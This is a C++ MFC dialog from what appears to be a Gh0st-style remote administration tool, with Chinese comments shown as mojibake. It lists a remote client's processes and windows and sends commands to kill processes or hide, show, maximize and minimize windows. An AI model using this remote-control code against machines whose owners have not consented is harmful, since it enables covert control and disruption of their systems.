// SystemDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Remote.h"
#include "SystemDlg.h"
#include "afxdialogex.h"
#include <iostream>
#include "Common.h"

// CSystemDlg �Ի���


enum
{
	COMMAND_WINDOW_CLOSE,   //�رմ���
	COMMAND_WINDOW_TEST,    //��������
};
IMPLEMENT_DYNAMIC(CSystemDlg, CDialog)

CSystemDlg::CSystemDlg(CWnd* pParent /*=NULL*/,
	IOCPServer* IOCPServer, CONTEXT_OBJECT* ContextObject)
	: CDialog(IDD_DIALOG_SYSTEM, pParent)
{
	m_ContextOBject = ContextObject;
	m_IOCPServer = IOCPServer;
	char* lpBuffer = (char*)(m_ContextOBject->InDeCompressedBuffer.GetBuffer(0));
	m_bHow = lpBuffer[0];
}

CSystemDlg::~CSystemDlg()
{
	std::cout << "ϵͳ����" << "\r\n";

}



void CSystemDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_SYSTEM, m_ControlList);
}


BEGIN_MESSAGE_MAP(CSystemDlg, CDialog)
	//ON_NOTIFY(LVN_ITEMCHANGED, IDC_LIST_SYSTEM, &CSystemDlg::OnItemchangedListSystem)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_SYSTEM, &CSystemDlg::OnNMRClickListSystem)
	ON_COMMAND(ID_PLIST_KILL, &CSystemDlg::OnPlistKill)
	ON_COMMAND(ID_PLIST_REFRESH, &CSystemDlg::OnPlistRefresh)
	ON_WM_CLOSE()
	ON_COMMAND(ID_WLIST_REFRESH, &CSystemDlg::OnWlistRefresh)
	ON_COMMAND(ID_WLIST_CLOSE, &CSystemDlg::OnWlistClose)
	ON_COMMAND(ID_WLIST_HIDE, &CSystemDlg::OnWlistHide)
	ON_COMMAND(ID_WLIST_RECOVER, &CSystemDlg::OnWlistRecover)
	ON_COMMAND(ID_WLIST_MAX, &CSystemDlg::OnWlistMax)
	ON_COMMAND(ID_WLIST_MIN, &CSystemDlg::OnWlistMin)
END_MESSAGE_MAP()


// CSystemDlg ��Ϣ�������


BOOL CSystemDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	CString str;
	sockaddr_in ClientAddr;
	memset(&ClientAddr, 0, sizeof(ClientAddr));
	int iSocketLength = sizeof(ClientAddr);

	BOOL bResults = getpeername(m_ContextOBject->ClientSocket, (SOCKADDR*)&ClientAddr, &iSocketLength);
	//���ô��ڱ���
	str.Format("\\\\%s - ϵͳ����", bResults != INVALID_SOCKET ? inet_ntoa(ClientAddr.sin_addr) : "");
	SetWindowText(str);

	m_ControlList.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	if (m_bHow == TOKEN_PSLIST)
	{
		m_ControlList.InsertColumn(0, "Ӱ������", LVCFMT_LEFT, 120);
		m_ControlList.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
		m_ControlList.InsertColumn(2, "����·��", LVCFMT_LEFT, 300);
		ShowProcessList();
	}
	else if (m_bHow == TOKEN_WSLIST)
	{
		m_ControlList.InsertColumn(0, "PID", LVCFMT_LEFT, 50);
		m_ControlList.InsertColumn(1, "��������", LVCFMT_LEFT, 300);
		m_ControlList.InsertColumn(2, "����״̬", LVCFMT_LEFT, 300);
		ShowWindowsList();
	}



	return TRUE;  // return TRUE unless you set the focus to a control
				  // �쳣: OCX ����ҳӦ���� FALSE
}
VOID CSystemDlg::ShowProcessList()
{
	char* szBuffer = (char*)(m_ContextOBject->InDeCompressedBuffer.GetBuffer(1));
	char* szExeFile;
	char* szProcessFullPath;
	DWORD dwOffset = 0;
	CString str;
	m_ControlList.DeleteAllItems();
	int i = 0;
	for (i = 0; dwOffset < m_ContextOBject->InDeCompressedBuffer.GetBufferLength() - 1;i++)
	{
		LPDWORD PID = LPDWORD(szBuffer +  dwOffset);
		szExeFile = szBuffer + dwOffset + sizeof(DWORD);
		szProcessFullPath = szExeFile + lstrlen(szExeFile) + 1;
		
		
		m_ControlList.InsertItem(i, szExeFile);       //���õ������ݼ��뵽�б���
		str.Format("%5u", *PID);
		m_ControlList.SetItemText(i, 1, str);
		m_ControlList.SetItemText(i, 2, (LPCTSTR)szProcessFullPath);
		// ItemData Ϊ����ID
		m_ControlList.SetItemData(i, *PID);

		dwOffset += sizeof(DWORD) + lstrlen(szExeFile) + lstrlen(szProcessFullPath) + 2;   //����������ݽṹ ������һ��ѭ��
 
	}

	str.Format("������� / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_ControlList.SetColumn(2, &lvc); 
}

VOID CSystemDlg::ShowWindowsList()
{
	char* szBuffer = (char*)(m_ContextOBject->InDeCompressedBuffer.GetBuffer(1));
	DWORD dwOffset = 0;
	char* szTitle = NULL;
	BOOL isDel = FALSE;

	m_ControlList.DeleteAllItems();
	CString str;
	int i = 0;
	for (i = 0; dwOffset < m_ContextOBject->InDeCompressedBuffer.GetBufferLength() - 1;i++)
	{
		//���ھ��
		LPDWORD lpPID = LPDWORD(szBuffer + dwOffset);

		//���ڱ���
		szTitle = (char*)szBuffer + dwOffset + sizeof(DWORD);

		str.Format("%5u", *lpPID);

		m_ControlList.InsertItem(i, str);
		m_ControlList.SetItemText(i, 1, szTitle);
		m_ControlList.SetItemText(i, 2, "��ʾ"); //(d) ������״̬��ʾΪ "��ʾ"


		m_ControlList.SetItemData(i, *lpPID);  //(d)   
		dwOffset += sizeof(DWORD) + lstrlen(szTitle) + 1;
	}

	str.Format("��������   ���ڸ�����%d��", i);   //�޸�CtrlList 
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_ControlList.SetColumn(1, &lvc);
}

VOID CSystemDlg::GetProcessList()
{
	BYTE bToken = COMMAND_PSLIST;
	m_IOCPServer->OnClientPreSending(m_ContextOBject, &bToken, 1);
	
}

VOID CSystemDlg::GetWindowsList()
{
	BYTE bToken = COMMAND_WSLIST;
	m_IOCPServer->OnClientPreSending(m_ContextOBject, &bToken, 1);
}

//void CSystemDlg::OnItemchangedListSystem(NMHDR *pNMHDR, LRESULT *pResult)
//{
	//LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	//*pResult = 0;
//}


void CSystemDlg::OnNMRClickListSystem(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������

	CMenu Menu;
	if (m_bHow == TOKEN_PSLIST)
	{
		Menu.LoadMenu(IDR_PROCESS_LIST);
	}
	else if (m_bHow == TOKEN_WSLIST)
	{
		Menu.LoadMenu(IDR_WINDOW_LIST);
	}
	CMenu* SubMenu = Menu.GetSubMenu(0);
	CPoint Point;
	GetCursorPos(&Point);
	SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);

	*pResult = 0;
}


void CSystemDlg::OnPlistKill()
{
	// TODO: �ڴ���������������
	CListCtrl* ListCtrl = NULL;
	if (m_ControlList.IsWindowVisible())
	{
		ListCtrl = &m_ControlList;
	}
	else
	{
		return;
	}
	//���ѡ�е�����
	//int a = ListCtrl->GetSelectedCount();
	LPBYTE szBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (ListCtrl->GetSelectedCount() * 4));

	szBuffer[0] = COMMAND_KILLPROCESS;
	char* szTips = "����: ��ֹ���̻ᵼ�²�ϣ�������Ľ����\n"
		"�������ݶ�ʧ��ϵͳ���ȶ����ڱ���ֹǰ��\n"
		"���̽�û�л��ᱣ����״̬�����ݡ�";
	CString str;
	if (ListCtrl->GetSelectedCount()> 1)
	{
		str.Format("%sȷʵ\n����ֹ��%d�������?", szTips, ListCtrl->GetSelectedCount());
	}
	else
	{
		str.Format("%sȷʵ\n����ֹ���������?", szTips);
	}
	if (::MessageBox(m_hWnd, str, "���̽�������", MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;

	DWORD dwOffset = 1;
	POSITION Pos = ListCtrl->GetFirstSelectedItemPosition();
	while (Pos)
	{
		int iItem = ListCtrl->GetNextSelectedItem(Pos);
		DWORD dwProcessId = ListCtrl->GetItemData(iItem);

		memcpy(szBuffer + dwOffset, &dwProcessId, sizeof(DWORD));

		dwOffset += sizeof(DWORD);
	}
	m_IOCPServer->OnClientPreSending(m_ContextOBject, szBuffer, LocalSize(szBuffer));

	LocalFree(szBuffer);
	OnPlistRefresh();
}


void CSystemDlg::OnPlistRefresh()
{
	// TODO: �ڴ���������������
	if (m_ControlList.IsWindowVisible())
	{
		m_ControlList.DeleteAllItems();
		GetProcessList();
		Sleep(1000);
		ShowProcessList();
	}
}


void CSystemDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	m_ContextOBject->v1 = 0;
	CancelIo((HANDLE)m_ContextOBject->ClientSocket);
	closesocket(m_ContextOBject->ClientSocket);
	CDialog::OnClose();
	CDialog::OnClose();
}
void CSystemDlg::OnReceiveComplete(void)
{
	switch (m_ContextOBject->InDeCompressedBuffer.GetBuffer(0)[0])
	{
	case TOKEN_PSLIST:
	{
		ShowProcessList();

		break;
	}
	case TOKEN_WSLIST:
	{
		ShowWindowsList();
		break;
	}

	default:
		// ���䷢���쳣����
		break;

	}
}

void CSystemDlg::OnWlistRefresh()
{
	// TODO: �ڴ���������������
	GetWindowsList();
}


void CSystemDlg::OnWlistClose()
{
	// TODO: �ڴ���������������
	BYTE lpMsgBuffer[20] = { 0 };
	CListCtrl* pListCtrl = NULL;

	pListCtrl = &m_ControlList;

	int iItem = pListCtrl->GetSelectionMark();
	if (iItem >= 0)
	{
		ZeroMemory(lpMsgBuffer, 20);
		lpMsgBuffer[0] = COMMAND_WINDOW_CLOSE;

		//�õ����ھ��
		DWORD hwmd = pListCtrl->GetItemData(iItem);

		memcpy(lpMsgBuffer + 1, &hwmd, sizeof(DWORD));

		m_IOCPServer->OnClientPreSending(m_ContextOBject, lpMsgBuffer, sizeof(lpMsgBuffer));

	}
}


void CSystemDlg::OnWlistHide()
{
	// TODO: �ڴ���������������
	BYTE lpMsgBuffer[20] = { 0 };
	CListCtrl* pListCtrl = &m_ControlList;


	int iItem = pListCtrl->GetSelectionMark();

	if (iItem >= 0)
	{
		ZeroMemory(lpMsgBuffer, 20);
		lpMsgBuffer[0] = COMMAND_WINDOW_TEST;

		DWORD hwnd = pListCtrl->GetItemData(iItem);
		pListCtrl->SetItemText(iItem, 2, "����");

		memcpy(lpMsgBuffer + 1, &hwnd, sizeof(DWORD));
		DWORD dHow = SW_HIDE;
		memcpy(lpMsgBuffer + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_IOCPServer->OnClientPreSending(m_ContextOBject, lpMsgBuffer, sizeof(lpMsgBuffer));

	}

	
}


void CSystemDlg::OnWlistRecover()
{
	// TODO: �ڴ���������������
	BYTE lpMsgBuffer[20];
	CListCtrl	*pListCtrl = NULL;
	pListCtrl = &m_ControlList;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuffer, 20);
		lpMsgBuffer[0] = COMMAND_WINDOW_TEST;
		DWORD hwnd = pListCtrl->GetItemData(nItem);
		pListCtrl->SetItemText(nItem, 2, "��ʾ");
		memcpy(lpMsgBuffer + 1, &hwnd, sizeof(DWORD));
		DWORD dHow = SW_NORMAL;
		memcpy(lpMsgBuffer + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_IOCPServer->OnClientPreSending(m_ContextOBject, lpMsgBuffer, sizeof(lpMsgBuffer));

	}
}


void CSystemDlg::OnWlistMax()
{
	// TODO: �ڴ���������������
	BYTE lpMsgBuffer[20];
	CListCtrl	*pListCtrl = NULL;
	pListCtrl = &m_ControlList;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuffer, 20);
		lpMsgBuffer[0] = COMMAND_WINDOW_TEST;
		DWORD hwnd = pListCtrl->GetItemData(nItem);
		pListCtrl->SetItemText(nItem, 2, "��ʾ");
		memcpy(lpMsgBuffer + 1, &hwnd, sizeof(DWORD));
		DWORD dHow = SW_MAXIMIZE;
		memcpy(lpMsgBuffer + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_IOCPServer->OnClientPreSending(m_ContextOBject, lpMsgBuffer, sizeof(lpMsgBuffer));

	}
}


void CSystemDlg::OnWlistMin()
{
	// TODO: �ڴ���������������
	BYTE lpMsgBuffer[20];
	CListCtrl	*pListCtrl = NULL;
	pListCtrl = &m_ControlList;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuffer, 20);
		lpMsgBuffer[0] = COMMAND_WINDOW_TEST;
		DWORD hwnd = pListCtrl->GetItemData(nItem);
		pListCtrl->SetItemText(nItem, 2, "��ʾ");
		memcpy(lpMsgBuffer + 1, &hwnd, sizeof(DWORD));
		DWORD dHow = SW_MINIMIZE;
		memcpy(lpMsgBuffer + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_IOCPServer->OnClientPreSending(m_ContextOBject, lpMsgBuffer, sizeof(lpMsgBuffer));
	}
}
